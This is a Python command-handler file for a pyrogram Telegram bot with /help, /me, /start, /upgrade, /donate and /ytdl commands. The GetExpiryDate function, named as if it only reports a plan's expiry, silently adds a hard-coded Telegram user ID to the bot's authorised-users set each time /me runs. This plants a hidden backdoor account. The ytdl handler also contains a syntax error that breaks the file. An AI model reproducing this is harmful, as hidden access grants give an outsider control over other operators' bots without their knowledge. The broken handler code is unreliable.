#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER.format(update.from_user.first_name),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/me")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html", 
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton

@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name),
        #reply_to_message_id=update.message_id
        reply_markup=InlineKeyboardMarkup(
        [
         [
          InlineKeyboardButton('My Father👨‍💻', url='https://t.me/Ns_AnoNymouS'),
          InlineKeyboardButton('Discuss Group 🗣', url='https://t.me/anonymousbotdiscussion')
         ],
         [
          InlineKeyboardButton('Updates Channel 📣', url='https://t.me/anonymousbotupdates'),
          InlineKeyboardButton('Rate me ⭐', url='https://t.me/anonymousbotdiscussion/92')
         ],
         [
         InlineKeyboardButton(text="🤝Help",callback_data="help_back")
         ]
        ]
       )
     )



@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
async def donate(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text="Nice to listen this words from you {}, but my father don't want money now he will ask you later 🥰".format(update.from_user.first_name),
        parse_mode="html",
        
    )

from pyrogram import InlineKeyboardButton, InlineKeyboardMarkup 

@pyrogram.Client.on_message(pyrogram.Filters.command(["ytdl"]))
async def ytdl(bot, update):
       await bot.send_message(
             chat_id=update.chat.id,
             text="This are the supporting sites of ytdl👇"),
             reply_markup=InlineKeyboardMarkup(
             [
               [
                 InlineKeyboardButton('List - 1', url='https://telegra.ph/Supported-sites-for-YTdl-08-29'),
                 InlineKeyboardButton('List - 2', url='https://telegra.ph/Supported-Sites-For-YTdl-08-29-2')
                ],
                [
                  InlineKeyboardButton('List - 3', url='https://telegra.ph/Supported-Sites-For-YTdl-08-29-3')
                ]
              ]
             )
           )
